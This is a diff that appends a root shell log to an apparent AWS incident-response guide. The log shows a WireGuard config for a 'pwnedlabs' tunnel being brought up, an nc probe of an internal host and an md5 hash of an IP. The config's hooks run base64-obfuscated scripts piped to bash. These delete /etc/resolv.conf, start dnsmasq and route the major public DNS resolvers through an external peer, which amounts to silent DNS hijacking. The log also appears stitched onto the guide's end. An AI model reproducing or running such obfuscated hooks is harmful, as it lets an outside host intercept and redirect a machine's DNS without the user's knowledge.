@@ -202,3 +202,58 @@ Read it from the snapshot's **Tags** tab: **EC2 → Snapshots → Elastic Block 
 - Timing: capture before containment. Containment is irreversible with respect to evidence still being generated.
 
 **Further reading:** AWS VPC Flow Logs · EBS snapshot creation · Lambda + CloudWatch Logs · IAM permissions boundaries · EC2 security groups · S3 gateway endpoints · Session Manager · AWS Security Incident Response Guide.
+
+
+## 8. Logs
+```bash
+root@internal:~# mkdir pwnedlabs
+root@internal:~# cd pwnedlabs
+root@internal:~/pwnedlabs# nano pwnvpn.conf
+root@internal:~/pwnedlabs# root@internal:~/pwnedlabs# sudo wg-quick up ./pwnvpn.conf
+Warning: `/root/pwnedlabs/pwnvpn.conf' is world accessible
+[#] echo c2V0ICtlCmlwIHJvdXRlIGRlbCAxMC42Ni4wLjEvMzIgMj4vZGV2L251bGwKaXAgcm91dGUgZGVsIDEuMS4xLjEvMzIgMj4vZGV2L251bGwKaXAgcm91dGUgZGVsIDEuMC4wLjEvMzIgMj4vZGV2L251bGwKaXAgcm91dGUgZGVsIDguOC44LjgvMzIgMj4vZGV2L251bGwKaXAgcm91dGUgZGVsIDguOC40LjQvMzIgMj4vZGV2L251bGwKaXAgcm91dGUgZGVsIDkuOS45LjkvMzIgMj4vZGV2L251bGwKaXAgcm91dGUgZGVsIDE0OS4xMTIuMTEyLjExMi8zMiAyPi9kZXYvbnVsbAppcCByb3V0ZSBkZWwgMjA4LjY3LjIyMi4yMjIvMzIgMj4vZGV2L251bGwKaXAgcm91dGUgZGVsIDIwOC42Ny4yMjAuMjIwLzMyIDI+L2Rldi9udWxsCmlwIHJvdXRlIGRlbCA5NC4xNDAuMTQuMTQvMzIgMj4vZGV2L251bGwKaXAgcm91dGUgZGVsIDk0LjE0MC4xNS4xNS8zMiAyPi9kZXYvbnVsbApbIC1mIC9ydW4vcHdudnBuLmRucy5waWQgXSAmJiBraWxsICIkKGNhdCAvcnVuL3B3bnZwbi5kbnMucGlkKSIgMj4vZGV2L251bGwKcm0gLWYgL3J1bi9wd252cG4uZG5zLnBpZApleGl0IDAK | base64 -d | bash
+[#] ip link add pwnvpn type wireguard
+[#] wg setconf pwnvpn /dev/fd/63
+[#] ip -4 address add 10.66.0.3/32 dev pwnvpn
+[#] ip link set mtu 1200 up dev pwnvpn
+[#] ip -4 route add 94.140.15.15/32 dev pwnvpn
+[#] ip -4 route add 94.140.14.14/32 dev pwnvpn
+[#] ip -4 route add 9.9.9.9/32 dev pwnvpn
+[#] ip -4 route add 8.8.8.8/32 dev pwnvpn
+[#] ip -4 route add 8.8.4.4/32 dev pwnvpn
+[#] ip -4 route add 208.67.222.222/32 dev pwnvpn
+[#] ip -4 route add 208.67.220.220/32 dev pwnvpn
+[#] ip -4 route add 149.112.112.112/32 dev pwnvpn
+[#] ip -4 route add 10.66.0.1/32 dev pwnvpn
+[#] ip -4 route add 1.1.1.1/32 dev pwnvpn
+[#] ip -4 route add 1.0.0.1/32 dev pwnvpn
+[#] ip -4 route add 10.1.9.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.8.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.7.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.6.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.5.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.4.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.3.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.2.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.1.0/24 dev pwnvpn
+[#] ip -4 route add 10.1.0.0/24 dev pwnvpn
+[#] ip -4 route add 100.64.0.0/16 dev pwnvpn
+[#] echo c2V0ICtlClBJTj0xMjcuMC4wLjkKQkFLPS9ldGMvcHdudnBuLnJlc29sdi5iYWsKRE5TQT0iMTAuNjYuMC4xIjsgRE5TQj0iMy4xNDguMjAxLjY3IgpVUD0kKGdyZXAgLUUgJ15uYW1lc2VydmVyJyAvZXRjL3Jlc29sdi5jb25mIDI+L2Rldi9udWxsIHwgYXdrICd7cHJpbnQgJDJ9JyB8IGdyZXAgLXZFICdeMTI3XC4nIHwgaGVhZCAtMSkKWyAteiAiJFVQIiBdICYmIFVQPSQocmVzb2x2ZWN0bCBkbnMgMj4vZGV2L251bGwgfCB0ciAnICcgJ1xuJyB8IGdyZXAgLUUgJ14oWzAtOV17MSwzfVwuKXszfVswLTldezEsM30kJyB8IGdyZXAgLXZFICdeMTI3XC4nIHwgaGVhZCAtMSkKaWYgWyAteiAiJFVQIiBdICYmIFsgLWUgIiRCQUsiIF07IHRoZW4KICBVUD0kKGdyZXAgLUUgJ15uYW1lc2VydmVyJyAiJEJBSyIgMj4vZGV2L251bGwgfCBhd2sgJ3twcmludCAkMn0nIHwgZ3JlcCAtdkUgJ14xMjdcLicgfCBoZWFkIC0xKQpmaQpbIC16ICIkVVAiIF0gJiYgVVA9IjQuMi4yLjIiCmlmICEgZ3JlcCAtcUUgJ15uYW1lc2VydmVyW1s6c3BhY2U6XV0rMTI3XC4wXC4wXC45JyAvZXRjL3Jlc29sdi5jb25mIDI+L2Rldi9udWxsOyB0aGVuCiAgY3AgLWZQIC9ldGMvcmVzb2x2LmNvbmYgIiRCQUsiIDI+L2Rldi9udWxsCmZpClsgLWUgIiRCQUsiIF0gfHwgcHJpbnRmICduYW1lc2VydmVyICVzXG4nICIkVVAiID4gIiRCQUsiCkRNPQpETlNNQVNRPSQoY29tbWFuZCAtdiBkbnNtYXNxIDI+L2Rldi9udWxsIHx8IGVjaG8gL3Vzci9zYmluL2Ruc21hc3EpClsgLXggIiRETlNNQVNRIiBdICYmICIkRE5TTUFTUSIgLS1waWQtZmlsZT0vcnVuL3B3bnZwbi5kbnMucGlkIC0tY29uZi1maWxlPS9kZXYvbnVsbCAtLW5vLWhvc3RzIC0tbGlzdGVuLWFkZHJlc3M9JFBJTiAtLWJpbmQtaW50ZXJmYWNlcyAtLW5vLXJlc29sdiAtLXNlcnZlcj0xMC42Ni4wLjEgLS1zZXJ2ZXI9My4xNDguMjAxLjY3IDI+L2Rldi9udWxsICYmIERNPW9rCnJtIC1mIC9ldGMvcmVzb2x2LmNvbmYKaWYgWyAiJERNIiA9IG9rIF07IHRoZW4KICBwcmludGYgJ25hbWVzZXJ2ZXIgJXNcbm5hbWVzZXJ2ZXIgJXNcbicgIiRQSU4iICIkVVAiID4gL2V0Yy9yZXNvbHYuY29uZgplbHNlCiAgcHJpbnRmICduYW1lc2VydmVyICVzXG5uYW1lc2VydmVyICVzXG5uYW1lc2VydmVyICVzXG4nICIkRE5TQSIgIiRETlNCIiAiJFVQIiA+IC9ldGMvcmVzb2x2LmNvbmYKZmkKZXhpdCAwCg== | base64 -d | bash
+root@internal:~/pwnedlabs# wg show
+interface: pwnvpn
+  public key: 65CSen2+1xvAc3eeWlAF6YEYjfhOiopACV7VXavi9FM=
+  private key: (hidden)
+  listening port: 47015
+
+peer: IiqezO9Ajh2ZO8FsTkSRa3odgIARKKo72RfMuPboKmA=
+  endpoint: 3.148.201.67:51820
+  allowed ips: 100.64.0.0/16, 10.66.0.1/32, 1.1.1.1/32, 1.0.0.1/32, 8.8.8.8/32, 8.8.4.4/32, 9.9.9.9/32, 149.112.112.112/32, 208.67.222.222/32, 208.67.220.220/32, 94.140.14.14/32, 94.140.15.15/32, 10.1.0.0/24, 10.1.1.0/24, 10.1.2.0/24, 10.1.3.0/24, 10.1.4.0/24, 10.1.5.0/24, 10.1.6.0/24, 10.1.7.0/24, 10.1.8.0/24, 10.1.9.0/24
+  latest handshake: 16 seconds ago
+  transfer: 92 B received, 180 B sent
+  persistent keepalive: every 25 seconds
+root@internal:~/pwnedlabs# nc -vz 10.1.0.50 22
+Connection to 10.1.0.50 22 port [tcp/ssh] succeeded!
+root@internal:~/pwnedlabs# printf %s 10.1.0.134 | md5sum | cut -d' ' -f1
+68d098e5da59d19767ed72d7adcd76c7
+root@internal:~/pwnedlabs#
+```
